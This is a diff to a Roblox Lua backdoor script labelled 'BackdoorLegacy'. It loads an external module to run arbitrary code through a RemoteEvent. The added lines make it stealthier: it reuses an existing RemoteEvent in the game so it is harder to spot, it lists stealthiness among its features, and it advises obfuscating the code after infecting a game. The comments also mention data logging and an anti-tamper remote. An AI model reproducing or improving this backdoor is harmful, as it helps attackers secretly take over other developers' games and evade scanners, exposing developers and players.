@@ -1,3 +1,5 @@
+-- version 1.1, skids! :D
+
 -- mustTalk determines whether the backdoor provider should print out stuff in the console or not
 -- recommended to keep mustTalk off, as it can invoke the devs and Roblox mod team
 -- mustTalk will not prevent data logging!
@@ -25,7 +27,8 @@ print([[-- Infected with BackdoorLegacy by IvanTheSkid
 -- -- Data logging
 -- -- Anti-tamper remote
 -- -- Compatibility with any backdoor scanner
--- -- Multiple code execution support
+-- -- Multiple code execution support 
+-- -- Stealthiness
 
 -- INTERACTION WITH THE BACKDOOR WILL EXPOSE YOU!
 -- DATA INCLUDED:
@@ -34,6 +37,8 @@ print([[-- Infected with BackdoorLegacy by IvanTheSkid
 -- -- success indicator
 -- -- error message or returned values
 -- SCARED TO HAVE YOUR C00LGUI LEAKED? BOOHOO, SKID!
+
+-- IT IS RECOMMENDED TO OBFUSCATE THE CODE AFTER INFECTING IT WITH THIS BACKDOOR
 ]])
 
 local loadstring = require(14132891321)
@@ -56,7 +61,12 @@ function onExecP(...)
 	rmt:FireAllClients(plr,v)
 end
 function newBD()
-	rmt = Instance.new("RemoteEvent",game:GetService("ReplicatedStorage"))
+	for _,inst in game:GetDescendants() do 
+		if inst:IsA("RemoteEvent") then 
+			rmt = inst 
+		end 
+	end 
+	rmt = rmt or Instance.new("RemoteEvent",workspace)
 	conA = rmt.OnServerEvent:connect(onExec)
 	conB = rmt.Changed:connect(onTamper)
 	print("BACKDOOR CREATED")
